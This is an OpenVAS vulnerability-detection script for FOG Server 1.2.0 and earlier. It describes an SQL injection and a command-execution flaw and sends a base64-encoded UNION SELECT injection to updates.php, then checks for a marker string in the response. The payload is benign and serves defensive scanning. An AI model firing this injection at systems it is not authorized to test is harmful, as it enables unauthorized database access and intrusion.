###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fog_server_multi_vuln.nasl 4473 2016-11-11 08:44:06Z ckuerste $
#
# FOG Server Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:fogproject:fog";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106383");
  script_version("$Revision: 4473 $");
  script_tag(name: "last_modification", value: "$Date: 2016-11-11 09:44:06 +0100 (Fri, 11 Nov 2016) $");
  script_tag(name: "creation_date", value: "2016-11-10 15:06:58 +0700 (Thu, 10 Nov 2016)");
  script_tag(name: "cvss_base", value: "10.0");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "VendorFix");

  script_name("FOG Server Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_fog_server_detect.nasl");
  script_mandatory_keys("fog_server/installed");

  script_tag(name: "summary", value: "FOG Server is prone to multiple vulnerabilities.");

  script_tag(name: "vuldetect", value: "Tries to execute an SQL injection and checks
the response.");

  script_tag(name: "insight", value: "FOG Server is prone to multiple vulnerabilities:

- SQL injection: The database functions located in the FOGManagerController.class.php
file do not sanitize some parameters, which can input from unauthenticated users. 

- Remote Command Execution: The freespace.php file does not correctly sanitize
user-supplied 'idnew' parameters. An unauthenticated attacker may use this file to
execute system commands.");

  script_tag(name: "impact", value: "An authenticated attacker may execute arbitrary
system commands or retrieve sensitive information from the database.");

  script_tag(name: "affected", value: "FOG Server 1.2.0 and prior.");

  script_tag(name: "solution", value: "Update to 1.3.0 or later.");

  script_xref(name: "URL", value: "https://sysdream.com/news/lab/2016-07-19-fog-project-multiple-vulnerabilities/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

url = dir + "/service/updates.php?action=ask&file=JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwsTlVMTCwweDRmNzA2NTZlNTY0MTUzMmQ1MzUxNGMyZDQ5NmU2YTY1NjM3NDY5NmY2ZTJkNTQ2NTczNzQsTlVMTCxOVUxMLS0g";

if (http_vuln_check(port: port, url: url, pattern: "OpenVAS-SQL-Injection-Test", check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
